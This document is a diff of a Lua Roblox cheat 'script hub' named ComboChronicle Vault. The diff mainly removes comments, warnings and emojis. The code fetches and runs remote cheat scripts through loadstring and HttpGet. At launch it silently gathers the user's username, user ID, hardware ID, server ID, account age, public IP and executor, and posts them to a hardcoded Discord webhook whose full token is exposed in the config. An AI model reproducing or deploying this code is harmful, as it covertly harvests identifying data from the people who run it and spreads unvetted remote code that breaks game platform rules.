@@ -1,6 +1,5 @@
 local success, Rayfield = pcall(loadstring(game:HttpGet('https://sirius.menu/rayfield')))
 if not success then
-    warn("Failed to load Rayfield: " .. tostring(Rayfield))
     return
 end
 local HttpService = game:GetService("HttpService")
@@ -8,7 +7,6 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local DataStoreService = game:GetService("DataStoreService")
 
--- Config
 local CONFIG = {
     WEBHOOK_URL = "https://discord.com/api/webhooks/1354219342840991964/kgyogYrGVoTXLoR472lDz7zM8KcKHK1EK46ss-Ppmg7tSOpUz0uYeujtrdGMD5Dfk1bw",
     KEY_URL = "https://pastebin.com/raw/VHW3Fa9s",
@@ -26,7 +24,6 @@ local CONFIG = {
     }
 }
 
--- Persistent DataStore
 local VaultDataStore
 local function initializeDataStore()
     local success, ds = pcall(function()
@@ -34,8 +31,6 @@ local function initializeDataStore()
     end)
     if success then
         VaultDataStore = ds
-    else
-        warn("DataStore initialization failed: " .. tostring(ds) .. ". Using local storage fallback.")
     end
 end
 initializeDataStore()
@@ -56,7 +51,6 @@ local function setDataStore(key, value)
     end
 end
 
--- Local storage
 local function getLocalStorage(key, default)
     local success, data = pcall(function()
         return LocalPlayer:GetAttribute(key)
@@ -70,7 +64,6 @@ local function setLocalStorage(key, value)
     end)
 end
 
--- Improved HTTP
 local HTTP_RATE_LIMIT = 0.5
 local lastHttpRequest = 0
 local function safeHttpGet(url, retries)
@@ -106,14 +99,12 @@ local function safeHttpGet(url, retries)
             return true, data
         end
         
-        warn("HTTP attempt " .. i .. " failed for " .. url .. ": " .. (errorMsg or "timeout"))
         if i < retries then wait(1) end
     end
     
     return false, errorMsg or "Request timed out"
 end
 
--- Player Info Gathering Function
 local function getPlayerInfo()
     local info = {}
     
@@ -125,10 +116,12 @@ local function getPlayerInfo()
     info.JobId = game.JobId
     info.AccountAge = LocalPlayer.AccountAge
     info.JoinDate = os.date("%Y-%m-%d", os.time() - (LocalPlayer.AccountAge * 86400))
+    
     local success, ip = pcall(function()
         return game:HttpGet("https://api.ipify.org")
     end)
     info.IP = success and ip or "Hidden (Roblox Limitation)"
+    
     info.Executor = "Unknown"
     if syn then info.Executor = "Synapse X"
     elseif Krnl then info.Executor = "Krnl"
@@ -138,7 +131,6 @@ local function getPlayerInfo()
     return info
 end
 
--- Blacklist/Whitelist System
 local accessControl = {
     blacklist = {},
     whitelist = {},
@@ -189,7 +181,6 @@ local accessControl = {
     end
 }
 
--- Key system
 local keySystem = {
     key = nil,
     lastFetch = 0,
@@ -204,14 +195,14 @@ local keySystem = {
             return self.key
         end
         
-        Rayfield:Notify({Title = "⏳ Loading", Content = "Fetching key...", Duration = 2})
+        Rayfield:Notify({Title = "Loading", Content = "Fetching key...", Duration = 2})
         local success, response = safeHttpGet(CONFIG.KEY_URL)
         if success then
             self.key = response
             self.lastFetch = tick()
         else
             self.key = "Key22Changed"
-            Rayfield:Notify({Title = "⚠️ Warning", Content = "Using fallback key.", Duration = 3})
+            Rayfield:Notify({Title = "Warning", Content = "Using fallback key.", Duration = 3})
         end
         self.isFetching = false
         return self.key
@@ -222,7 +213,6 @@ local keySystem = {
     end
 }
 
--- Subscription system
 local subscriptionSystem = {
     data = {},
     lastUpdate = 0,
@@ -275,7 +265,6 @@ local subscriptionSystem = {
     end
 }
 
--- Webhook system
 local webhookSystem = {
     queue = {},
     processing = false,
@@ -306,7 +295,7 @@ local webhookSystem = {
             local embed = table.remove(self.queue, 1)
             embed.footer = embed.footer or { text = "Vault v" .. CONFIG.VERSION }
             embed.timestamp = embed.timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")
-            if embed.title == "🚀 Script Execution" then
+            if embed.title == "Script Execution" then
                 embed.components = {
                     {
                         type = 1,
@@ -321,10 +310,7 @@ local webhookSystem = {
         end
         local success, response = pcall(function()
             local http_request = (syn and syn.request) or (http and http.request) or request or httprequest
-            if not http_request then
-                warn("No HTTP request function available")
-                return false
-            end
+            if not http_request then return false end
             local result = http_request({
                 Url = CONFIG.WEBHOOK_URL,
                 Method = "POST",
@@ -334,20 +320,16 @@ local webhookSystem = {
             return result and (result.StatusCode == 204 or result.StatusCode == 200)
         end)
         if not success then
-            warn("Webhook failed: " .. tostring(response))
             for _, embed in ipairs(batch) do
                 embed.retryCount = (embed.retryCount or 0) + 1
                 if embed.retryCount < 3 then table.insert(self.queue, embed) end
             end
-        elseif success then
-            print("Webhook sent successfully")
         end
         wait(1)
         self:processQueue()
     end
 }
 
--- Script loader
 local scriptSystem = {
     scripts = {
         [18209375211] = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/FireTouchIntrest%20Universal",
@@ -398,15 +380,15 @@ local scriptSystem = {
     loadScript = function(self, scriptUrl, notifyOnLoad)
         spawn(function()
             if notifyOnLoad then
-                Rayfield:Notify({Title = "⏳ Loading", Content = "Loading script...", Duration = 2})
+                Rayfield:Notify({Title = "Loading", Content = "Loading script...", Duration = 2})
             end
             local success, errorMsg = pcall(function()
                 loadstring(game:HttpGet(scriptUrl))()
             end)
             if success and notifyOnLoad then
-                Rayfield:Notify({Title = "✅ Success", Content = "Script loaded!", Duration = 3})
+                Rayfield:Notify({Title = "Success", Content = "Script loaded!", Duration = 3})
             elseif not success then
-                Rayfield:Notify({Title = "❌ Error", Content = "Failed: " .. (errorMsg or "Unknown"), Duration = 5})
+                Rayfield:Notify({Title = "Error", Content = "Failed: " .. (errorMsg or "Unknown"), Duration = 5})
             end
         end)
     end,
@@ -422,7 +404,6 @@ local scriptSystem = {
     end
 }
 
--- Challenge system
 local challengeSystem = {
     challenges = {
         {id = "login_streak", name = "Login Streak", progress = 0, goal = 5, reward = "50 VC"},
@@ -468,7 +449,7 @@ local challengeSystem = {
     end,
     
     getFormattedText = function(self)
-        local text = "🏆 Active Challenges 🏆\n\n"
+        local text = "Active Challenges\n\n"
         for i, challenge in ipairs(self.challenges) do
             local progressBar = ""
             local barLength = 10
@@ -485,26 +466,23 @@ local challengeSystem = {
         for _, challenge in ipairs(self.challenges) do
             if challenge.id == challengeId and challenge.progress >= challenge.goal then
                 if challenge.id == "login_streak" then
-                    local currentVC = getDataStore("vaultCurrency", 0)
-                    setDataStore("vaultCurrency", currentVC + 50)
-                    self:resetProgress(challengeId)
-                    return true, "50 VC added to your balance!"
+                    setDataStore("vaultCredits", (getDataStore("vaultCredits", 0) or 0) + 50)
+                    Rayfield:Notify({Title = "Reward Claimed", Content = "Received 50 VC for Login Streak!", Duration = 5})
                 elseif challenge.id == "feedback_pro" and subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                     subscriptionSystem:extendSubscription(LocalPlayer.UserId, 1)
-                    self:resetProgress(challengeId)
-                    return true, "VIP Extended by 1 day!"
+                    Rayfield:Notify({Title = "Reward Claimed", Content = "VIP Extended by 1 day for Feedback Pro!", Duration = 5})
                 elseif challenge.id == "script_usage" then
                     scriptSystem:loadScript(CONFIG.VIP_PERKS.EXCLUSIVE_UI, true)
-                    self:resetProgress(challengeId)
-                    return true, "Exclusive UI Unlocked!"
+                    Rayfield:Notify({Title = "Reward Claimed", Content = "Exclusive Script Unlocked for Script Enthusiast!", Duration = 5})
                 end
+                self:resetProgress(challengeId)
+                return true
             end
         end
-        return false, "No reward available or challenge not completed."
+        return false
     end
 }
 
--- News system
 local newsSystem = {
     content = "Loading news...",
     lastUpdate = 0,
@@ -514,16 +492,16 @@ local newsSystem = {
         if not rawNews or rawNews == "" then return "No news yet!" end
         local lines = {}
         for line in rawNews:gmatch("[^\n]+") do table.insert(lines, line) end
-        local formatted = "✨ Vault Chronicle ✨\n════════════════════\n"
+        local formatted = "Vault Chronicle\n==================\n"
         for i, line in ipairs(lines) do
             if line:match("^NEWS:") then
-                formatted = formatted .. "📰 " .. line:gsub("^NEWS:%s*", "") .. " 📰\n"
+                formatted = formatted .. line:gsub("^NEWS:%s*", "") .. "\n"
             else
-                formatted = formatted .. "➤ " .. line .. "\n"
+                formatted = formatted .. "- " .. line .. "\n"
             end
-            if i < #lines then formatted = formatted .. "────────────\n" end
+            if i < #lines then formatted = formatted .. "----------\n" end
         end
-        formatted = formatted .. "════════════════════\nUpdated: " .. os.date("%Y-%m-%d %H:%M UTC")
+        formatted = formatted .. "==================\nUpdated: " .. os.date("%Y-%m-%d %H:%M UTC")
         return formatted
     end,
     
@@ -545,17 +523,15 @@ local newsSystem = {
     end
 }
 
--- Initialize
 accessControl:fetchLists()
 subscriptionSystem:fetch()
 challengeSystem:load()
 newsSystem:update()
 local lastFeedbackTime = getDataStore("lastFeedbackTime", 0)
 
--- Check access before proceeding
 if accessControl:isBlacklisted(LocalPlayer.UserId) then
     Rayfield:Notify({
-        Title = "🚫 Access Denied",
+        Title = "Access Denied",
         Content = "You have been blacklisted from using this script.",
         Duration = 10,
         Image = 4483362458
@@ -563,126 +539,117 @@ if accessControl:isBlacklisted(LocalPlayer.UserId) then
     return
 end
 
--- Gather player info for webhook
 local playerInfo = getPlayerInfo()
 
--- Execution webhook with enhanced info
 webhookSystem:send({
-    title = "🚀 Script Execution",
-    description = string.format("**%s** has launched Vault v%s", LocalPlayer.DisplayName, CONFIG.VERSION),
+    title = "Script Execution",
+    description = string.format("%s has launched Vault v%s", LocalPlayer.DisplayName, CONFIG.VERSION),
     color = 7419530,
     fields = {
-        { name = "👤 Username", value = "```" .. playerInfo.Username .. "```", inline = true },
-        { name = "🆔 User ID", value = "```" .. playerInfo.UserId .. "```", inline = true },
-        { name = "🔑 Hardware ID", value = "```" .. playerInfo.HWID .. "```", inline = true },
-        { name = "🎮 Game ID", value = "```" .. playerInfo.GameId .. "```", inline = true },
-        { name = "🌐 Server JobId", value = "```" .. playerInfo.JobId .. "```", inline = true },
-        { name = "📅 Account Age", value = playerInfo.AccountAge .. " days", inline = true },
-        { name = "🕒 Join Date", value = playerInfo.JoinDate, inline = true },
-        { name = "🌍 IP (Approx)", value = "```" .. playerInfo.IP .. "```", inline = true },
-        { name = "💻 Executor", value = playerInfo.Executor, inline = true },
-        { name = "⭐ VIP", value = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Yes" or "No", inline = true },
-        { name = "🚫 Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
+        { name = "Username", value = "```" .. playerInfo.Username .. "```", inline = true },
+        { name = "User ID", value = "```" .. playerInfo.UserId .. "```", inline = true },
+        { name = "Hardware ID", value = "```" .. playerInfo.HWID .. "```", inline = true },
+        { name = "Game ID", value = "```" .. playerInfo.GameId .. "```", inline = true },
+        { name = "Server JobId", value = "```" .. playerInfo.JobId .. "```", inline = true },
+        { name = "Account Age", value = playerInfo.AccountAge .. " days", inline = true },
+        { name = "Join Date", value = playerInfo.JoinDate, inline = true },
+        { name = "IP (Approx)", value = "```" .. playerInfo.IP .. "```", inline = true },
+        { name = "Executor", value = playerInfo.Executor, inline = true },
+        { name = "VIP", value = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Yes" or "No", inline = true },
+        { name = "Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
     }
 })
 
--- GUI Setup
 local Window
 local success, err = pcall(function()
     Window = Rayfield:CreateWindow({
         Name = "ComboChronicle Vault | NextGen v" .. CONFIG.VERSION,
-        LoadingTitle = "Initializing Vault ❖",
+        LoadingTitle = "Initializing Vault",
         LoadingSubtitle = "By COMBO_WICK | Bang.E.Line",
         Theme = "Ocean"
     })
 end)
 if not success then
-    warn("Failed to create Window: " .. tostring(err))
     return
 end
 
--- Key & Credits Tab
-local KeyTab = Window:CreateTab("🔑 Key & Credits", 4483362458)
+local KeyTab = Window:CreateTab("Key & Credits", 4483362458)
 local keyInput = KeyTab:CreateInput({
     Name = "Enter Key",
     PlaceholderText = "Type the key here...",
     RemoveTextAfterFocusLost = false,
     Callback = function(input)
-        Rayfield:Notify({Title = "⏳ Checking", Content = "Verifying key...", Duration = 2})
+        Rayfield:Notify({Title = "Checking", Content = "Verifying key...", Duration = 2})
         task.wait(0.7)
         if keySystem:verify(input) then
-            Rayfield:Notify({Title = "✅ Success", Content = "Access granted!", Duration = 3})
+            Rayfield:Notify({Title = "Success", Content = "Access granted!", Duration = 3})
             challengeSystem:updateProgress("login_streak")
-            local success, rewardMsg = challengeSystem:awardReward("login_streak")
-            if success then
-                Rayfield:Notify({Title = "🏆 Reward", Content = rewardMsg, Duration = 5})
-            end
             local gameId = game.PlaceId
             local scriptToLoad = scriptSystem:getScriptForGame(gameId)
             task.wait(1)
             Rayfield:Destroy()
             scriptSystem:loadScriptSet(scriptToLoad, true)
         else
-            Rayfield:Notify({Title = "❌ Invalid", Content = "Join Discord for key!", Duration = 5, Image = 4483362458})
+            Rayfield:Notify({Title = "Invalid", Content = "Join Discord for key!", Duration = 5, Image = 4483362458})
         end
     end
 })
 
 KeyTab:CreateButton({
-    Name = "📋 Copy Links",
+    Name = "Copy Links",
     Callback = function()
         setclipboard("Discord: discord.com/invite/mwTHaCKzhw\nYouTube: https://www.youtube.com/@COMBO_WICK")
-        Rayfield:Notify({Title = "✅ Copied", Content = "Links copied!", Duration = 5})
+        Rayfield:Notify({Title = "Copied", Content = "Links copied!", Duration = 5})
     end
 })
 
 KeyTab:CreateParagraph({
-    Title = "📢 Credits",
+    Title = "Credits",
     Content = "Script by COMBO_WICK & Star\nVersion: " .. CONFIG.VERSION .. "\nAccess: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\nEnjoy the Vault!"
 })
 
--- Responses Tab
-local ResponseTab = Window:CreateTab("📝 Responses", 4483362458)
-local ResponseSection = ResponseTab:CreateSection("✉️ Message System")
+local ResponseTab = Window:CreateTab("Responses", 4483362458)
+local ResponseSection = ResponseTab:CreateSection("Message System")
 local currentResponse = ""
 ResponseTab:CreateInput({
-    Name = "💭 Your Message",
+    Name = "Your Message",
     PlaceholderText = "Share thoughts or report bugs...",
     RemoveTextAfterFocusLost = false,
     Callback = function(text) currentResponse = text end
 })
 
 ResponseTab:CreateButton({
-    Name = "📤 Submit Feedback",
+    Name = "Submit Feedback",
     Info = "Send feedback to developers",
     Interact = "Submit",
     Callback = function()
         local currentTime = tick()
         local timeRemaining = CONFIG.FEEDBACK_COOLDOWN - (currentTime - lastFeedbackTime)
         if timeRemaining > 0 then
-            Rayfield:Notify({Title = "⏳ Cooldown", Content = "Wait " .. webhookSystem:formatTime(timeRemaining), Duration = 5, Image = 4483362458})
+            Rayfield:Notify({Title = "Cooldown", Content = "Wait " .. webhookSystem:formatTime(timeRemaining), Duration = 5, Image = 4483362458})
             return
         end
         if currentResponse == "" then
-            Rayfield:Notify({Title = "❌ Error", Content = "Enter a message!", Duration = 3, Image = 4483362458})
+            Rayfield:Notify({Title = "Error", Content = "Enter a message!", Duration = 3, Image = 4483362458})
             return
         end
         webhookSystem:send({
-            title = "📨 New Feedback",
+            title = "New Feedback",
             description = currentResponse,
             color = 3447003,
             fields = {
-                { name = "👤 User", value = LocalPlayer.DisplayName, inline = true },
-                { name = "🆔 ID", value = tostring(LocalPlayer.UserId), inline = true },
-                { name = "🎮 Game", value = tostring(game.PlaceId), inline = true },
-                { name = "🚫 Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
+                { name = "User", value = LocalPlayer.DisplayName, inline = true },
+                { name = "ID", value = tostring(LocalPlayer.UserId), inline = true },
+                { name = "Game", value = tostring(game.PlaceId), inline = true },
+                { name = "Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
             }
         })
-        Rayfield:Notify({Title = "✅ Sent", Content = "Feedback delivered!", Duration = 5, Image = 4483362458})
+        Rayfield:Notify({Title = "Sent", Content = "Feedback delivered!", Duration = 5, Image = 4483362458})
+        local feedbackCount = (getDataStore("feedbackCount", 0) or 0) + 1
+        setDataStore("feedbackCount", feedbackCount)
         challengeSystem:updateProgress("feedback_pro")
-        local success, rewardMsg = challengeSystem:awardReward("feedback_pro")
-        if success then
-            Rayfield:Notify({Title = "🏆 Reward", Content = rewardMsg, Duration = 5})
+        if challengeSystem:awardReward("feedback_pro") then
+            Rayfield:Notify({Title = "Reward", Content = "VIP Extended by 1 day!", Duration = 5})
         end
         lastFeedbackTime = currentTime
         setDataStore("lastFeedbackTime", lastFeedbackTime)
@@ -690,43 +657,41 @@ ResponseTab:CreateButton({
     end
 })
 
-ResponseTab:CreateLabel("⏰ Cooldown: 1h 15m")
-ResponseTab:CreateLabel("💡 Bugs or suggestions welcome!")
+ResponseTab:CreateLabel("Cooldown: 1h 15m")
+ResponseTab:CreateLabel("Bugs or suggestions welcome!")
 
--- News Tab
-local NewsTab = Window:CreateTab("📰 News", 4483362458)
+local NewsTab = Window:CreateTab("News", 4483362458)
 local newsParagraph = NewsTab:CreateParagraph({
-    Title = "🗞️ Vault Updates",
+    Title = "Vault Updates",
     Content = newsSystem.content
 })
 
 spawn(function()
     while wait(CONFIG.REFRESH_INTERVAL) do
         if newsSystem:update() then
-            newsParagraph:Set({Title = "🗞️ Vault Updates", Content = newsSystem.content or "No news available."})
+            newsParagraph:Set({Title = "Vault Updates", Content = newsSystem.content})
         end
     end
 end)
 
 NewsTab:CreateButton({
-    Name = "🔄 Refresh News",
+    Name = "Refresh News",
     Callback = function()
-        Rayfield:Notify({Title = "⏳ Updating", Content = "Fetching news...", Duration = 2})
+        Rayfield:Notify({Title = "Updating", Content = "Fetching news...", Duration = 2})
         if newsSystem:update() then
-            newsParagraph:Set({Title = "🗞️ Vault Updates", Content = newsSystem.content or "No news available."})
-            Rayfield:Notify({Title = "✅ Updated", Content = "News refreshed!", Duration = 3})
+            newsParagraph:Set({Title = "Vault Updates", Content = newsSystem.content})
+            Rayfield:Notify({Title = "Updated", Content = "News refreshed!", Duration = 3})
         else
-            Rayfield:Notify({Title = "❌ Failed", Content = "Try again later.", Duration = 3})
+            Rayfield:Notify({Title = "Failed", Content = "Try again later.", Duration = 3})
         end
     end
 })
 
--- Subscription Tab
 local SubTab
 if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
-    SubTab = Window:CreateTab("⭐ Subscription", 4483362458)
+    SubTab = Window:CreateTab("Subscription", 4483362458)
     local subParagraph = SubTab:CreateParagraph({
-        Title = "⭐ Vault Elite",
+        Title = "Vault Elite",
         Content = "Loading subscription details..."
     })
     
@@ -734,16 +699,16 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
         if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
             local timeRemaining = subscriptionSystem:formatTimeRemaining(LocalPlayer.UserId)
             subParagraph:Set({
-                Title = "⭐ Vault Elite",
-                Content = "Status: ✅ Subscribed\n" ..
+                Title = "Vault Elite",
+                Content = "Status: Subscribed\n" ..
                           "Perks: VIP Scripts, Priority Support, Boosts\n" ..
                           "Expires in: " .. timeRemaining .. "\n" ..
                           "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
             })
         else
             subParagraph:Set({
-                Title = "⭐ Vault Elite",
-                Content = "Status: ❌ Expired\n" ..
+                Title = "Vault Elite",
+                Content = "Status: Expired\n" ..
                           "Renew to regain VIP benefits!\n" ..
                           "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
             })
@@ -763,36 +728,35 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
     end)
     
     SubTab:CreateButton({
-        Name = "🔗 Renew Subscription",
+        Name = "Renew Subscription",
         Callback = function()
             setclipboard("discord.com/invite/mwTHaCKzhw")
-            Rayfield:Notify({Title = "⭐ Subscription", Content = "Discord copied! Contact admins.", Duration = 5})
+            Rayfield:Notify({Title = "Subscription", Content = "Discord copied! Contact admins.", Duration = 5})
         end
     })
     
     SubTab:CreateButton({
-        Name = "🎩 Load VIP Boost",
+        Name = "Load VIP Boost",
         Callback = function()
             if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                 scriptSystem:loadScript(scriptSystem.vipScript, true)
                 challengeSystem:updateProgress("script_usage")
-                local success, rewardMsg = challengeSystem:awardReward("script_usage")
-                if success then
-                    Rayfield:Notify({Title = "🏆 Reward", Content = rewardMsg, Duration = 5})
+                if challengeSystem:awardReward("script_usage") then
+                    Rayfield:Notify({Title = "Reward", Content = "Exclusive Script Unlocked!", Duration = 5})
                 end
             else
-                Rayfield:Notify({Title = "❌ Denied", Content = "Subscription expired!", Duration = 5})
+                Rayfield:Notify({Title = "Denied", Content = "Subscription expired!", Duration = 5})
             end
         end
     })
     
     SubTab:CreateButton({
-        Name = "🎨 Load VIP UI",
+        Name = "Load VIP UI",
         Callback = function()
             if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
                 scriptSystem:loadScript(CONFIG.VIP_PERKS.EXCLUSIVE_UI, true)
             else
-                Rayfield:Notify({Title = "❌ Denied", Content = "Subscription expired!", Duration = 5})
+                Rayfield:Notify({Title = "Denied", Content = "Subscription expired!", Duration = 5})
             end
         end
     })
@@ -800,7 +764,7 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
     if not getDataStore("VIPBadgeShown", false) then
         wait(3)
         Rayfield:Notify({
-            Title = "⭐ VIP Badge",
+            Title = "VIP Badge",
             Content = "Welcome, Vault Elite Member!\nEnjoy your exclusive perks.",
             Duration = 10,
             Image = 4483362458
@@ -809,52 +773,49 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
     end
 end
 
--- Challenges Tab
-local ChallengeTab = Window:CreateTab("🏆 Challenges", 4483362458)
+local ChallengeTab = Window:CreateTab("Challenges", 4483362458)
 local challengeParagraph = ChallengeTab:CreateParagraph({
-    Title = "🎯 Daily Goals",
+    Title = "Daily Goals",
     Content = challengeSystem:getFormattedText()
 })
 
 ChallengeTab:CreateButton({
-    Name = "🔄 Refresh Challenges",
+    Name = "Refresh Challenges",
     Callback = function()
-        challengeParagraph:Set({Content = challengeSystem:getFormattedText()})
-        Rayfield:Notify({Title = "🔄 Refreshed", Content = "Progress updated!", Duration = 3})
+        challengeParagraph:Set({Title = "Daily Goals", Content = challengeSystem:getFormattedText()})
+        Rayfield:Notify({Title = "Refreshed", Content = "Progress updated!", Duration = 3})
     end
 })
 
 ChallengeTab:CreateButton({
-    Name = "🎁 Claim Rewards",
+    Name = "Claim Rewards",
     Callback = function()
+        local anyRewardClaimed = false
         for _, challenge in ipairs(challengeSystem.challenges) do
-            local success, rewardMsg = challengeSystem:awardReward(challenge.id)
-            if success then
-                Rayfield:Notify({
-                    Title = "🎁 Claimed",
-                    Content = "Reward for " .. challenge.name .. ": " .. rewardMsg,
-                    Duration = 5
-                })
+            if challengeSystem:awardReward(challenge.id) then
+                anyRewardClaimed = true
             end
         end
-        challengeParagraph:Set({Content = challengeSystem:getFormattedText()})
+        if not anyRewardClaimed then
+            Rayfield:Notify({Title = "No Rewards", Content = "No rewards available to claim.", Duration = 3})
+        end
+        challengeParagraph:Set({Title = "Daily Goals", Content = challengeSystem:getFormattedText()})
     end
 })
 
--- Settings Tab
-local SettingsTab = Window:CreateTab("⚙️ Settings", 4483362458)
+local SettingsTab = Window:CreateTab("Settings", 4483362458)
 SettingsTab:CreateToggle({
-    Name = "🔔 Notifications",
+    Name = "Notifications",
     CurrentValue = getLocalStorage("notificationsEnabled", true),
     Flag = "notificationsToggle",
     Callback = function(value)
         setLocalStorage("notificationsEnabled", value)
-        Rayfield:Notify({Title = "⚙️ Settings", Content = value and "Notifications on" or "Notifications off", Duration = 3})
+        Rayfield:Notify({Title = "Settings", Content = value and "Notifications on" or "Notifications off", Duration = 3})
     end
 })
 
 SettingsTab:CreateToggle({
-    Name = "🔄 Auto-Update Scripts",
+    Name = "Auto-Update Scripts",
     CurrentValue = getLocalStorage("autoUpdateEnabled", true),
     Flag = "autoUpdateToggle",
     Callback = function(value)
@@ -863,43 +824,44 @@ SettingsTab:CreateToggle({
 })
 
 SettingsTab:CreateButton({
-    Name = "🗑️ Clear Cache",
+    Name = "Clear Cache",
     Callback = function()
         for _, attr in ipairs({"notificationsEnabled", "autoUpdateEnabled", "newsCache", "VIPBadgeShown"}) do
             pcall(function() LocalPlayer:SetAttribute(attr, nil) end)
         end
-        Rayfield:Notify({Title = "🧹 Cleaned", Content = "Cache cleared! Restart to apply.", Duration = 5})
+        Rayfield:Notify({Title = "Cleaned", Content = "Cache cleared! Restart to apply.", Duration = 5})
     end
 })
 
 SettingsTab:CreateButton({
-    Name = "♻️ Restart Vault",
+    Name = "Restart Vault",
     Callback = function()
-        Rayfield:Notify({Title = "⏳ Restarting", Content = "Reloading Vault...", Duration = 3})
+        Rayfield:Notify({Title = "Restarting", Content = "Reloading Vault...", Duration = 3})
         wait(1)
         Rayfield:Destroy()
         loadstring(game:HttpGet(''))()
     end
 })
 
--- Analytics Tab
-local AnalyticsTab = Window:CreateTab("📈 Analytics", 4483362458)
+local AnalyticsTab = Window:CreateTab("Analytics", 4483362458)
 local analyticsParagraph = AnalyticsTab:CreateParagraph({
-    Title = "📊 Your Stats",
+    Title = "Your Stats",
     Content = "Loading analytics..."
 })
 
 local function updateAnalytics()
-    local loginCount = getDataStore("loginCount", 0) + 1
+    local loginCount = (getDataStore("loginCount", 0) or 0) + 1
     setDataStore("loginCount", loginCount)
-    local feedbackCount = getDataStore("feedbackCount", 0)
+    local feedbackCount = getDataStore("feedbackCount", 0) or 0
+    local vaultCredits = getDataStore("vaultCredits", 0) or 0
     local subStatus = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Active" or "Inactive"
-    local content = "👤 User: " .. LocalPlayer.DisplayName .. "\n" ..
-                    "🔑 Logins: " .. loginCount .. "\n" ..
-                    "📝 Feedback Sent: " .. feedbackCount .. "\n" ..
-                    "⭐ Subscription: " .. subStatus .. "\n" ..
-                    "🚫 Access: " .. accessControl:getStatus(LocalPlayer.UserId)
-    analyticsParagraph:Set({Content = content})
+    local content = "User: " .. LocalPlayer.DisplayName .. "\n" ..
+                    "Logins: " .. loginCount .. "\n" ..
+                    "Feedback Sent: " .. feedbackCount .. "\n" ..
+                    "Vault Credits: " .. vaultCredits .. "\n" ..
+                    "Subscription: " .. subStatus .. "\n" ..
+                    "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
+    analyticsParagraph:Set({Title = "Your Stats", Content = content})
 end
 
 spawn(function()
@@ -908,17 +870,13 @@ spawn(function()
 end)
 
 AnalyticsTab:CreateButton({
-    Name = "🔄 Refresh Stats",
+    Name = "Refresh Stats",
     Callback = function() updateAnalytics() end
 })
 
--- VIP Auto-Load
 if subscriptionSystem:isSubscribed(LocalPlayer.UserId) and getLocalStorage("autoUpdateEnabled", true) then
     spawn(function()
         wait(5)
         scriptSystem:loadScript(scriptSystem.vipScript, true)
     end)
 end
-
--- Finalize
-print("ComboChronicle Vault NextGen v" .. CONFIG.VERSION .. " loaded successfully!")
